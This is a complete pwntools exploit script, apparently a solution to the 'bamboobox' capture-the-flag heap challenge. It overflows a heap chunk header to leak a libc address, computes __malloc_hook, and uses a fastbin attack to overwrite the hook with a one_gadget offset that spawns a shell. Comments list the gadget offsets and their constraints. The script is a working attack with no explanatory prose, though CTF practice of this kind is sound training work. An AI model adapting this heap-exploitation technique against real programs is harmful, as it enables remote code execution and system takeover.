from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



io=process("./bamboobox")
# io=remote("node4.buuoj.cn",29708)
elf=ELF("./bamboobox")
libc=ELF("./libc-2.23.so")
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]


def show():
    io.sendlineafter("Your choice:",b"1")

def add(n,c):
    io.sendlineafter("Your choice:",b"2")
    io.sendlineafter("name:",str(n))
    io.sendafter("item:",c)

def edit(n,c,cc):
    io.sendlineafter("Your choice:",b"3")
    io.sendlineafter("item:",str(n))
    io.sendafter("name:",str(c))
    io.sendafter("item:",cc)

def delete(n):
    io.sendlineafter("Your choice:",b"4")
    io.sendlineafter("item:",str(n))

# add(0x40,b"asd") #0
add(0x10,b"cqb") #0
add(0x40,b"opo") #1
add(0x30,b"unun") #2
add(0x10,b"iii") #3

payload=cyclic(0x10)+p64(0)+p64(0x91)
edit(0,len(payload),payload)

delete(1)
add(0x40,b"aaa") #1
show()
leak_addr=u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
print("leak_addr:  "+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
free_hook=libc_addr+libc.sym[b"__free_hook"]
print("libc_addr:  "+hex(libc_addr))
print("malloc_hook:  "+hex(malloc_hook))
print("free_hook:  "+hex(free_hook))
shell=libc_addr+one_gadget[0]


gdb.attach(io)
pause()
add(0x30,b"ppp") #4
add(0x60,b"www") #5
add(0x40,b"qqq") #6
delete(5)



payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)

add(0x60,p64(shell)) #5
add(0x60,cyclic(0x13)+p64(shell)) #fake_chunk
add(0x40,b"aaa")


io.interactive()


# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL